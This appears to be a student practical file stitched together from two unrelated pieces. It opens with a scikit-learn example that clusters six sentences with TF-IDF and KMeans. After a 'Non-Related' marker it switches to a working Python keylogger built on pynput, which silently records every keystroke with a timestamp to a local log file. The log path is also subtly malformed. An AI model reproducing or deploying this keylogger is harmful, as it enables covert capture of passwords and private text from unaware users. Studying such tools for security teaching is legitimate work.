# Practical 8:


from sklearn.cluster import KMeans
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.metrics import silhouette_score

documents = [
    "Football is a popular sport",
    "The team won the match",
    "The government passed a new law",
    "The president gave a speech",
    "The player scored a goal",
    "Elections will be held soon"
]

vectorizer = TfidfVectorizer()
X = vectorizer.fit_transform(documents)

K = 2
kmeans = KMeans(n_clusters=K, random_state=42)

kmeans.fit(X)
print("Clustering Results:")
for i, doc in enumerate(documents):
    print("Cluster", kmeans.labels_[i], ":", doc)

score = silhouette_score(X, kmeans.labels_)
print(f"\nSilhouette Score: {score}")










#Non -Related:

from pynput.keyboard import Key, Listener
import logging
# Set the directory where logs will be stored
#change this directory as per your pc directory
log_dir = "C:/Users/Sumit/Desktop/EH"

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s:%(message)s')
# Function to capture keystrokes
def on_press(key):
    logging.info(str(key))
# Start listening for key presses
with Listener(on_press=on_press) as listener:
    listener.join()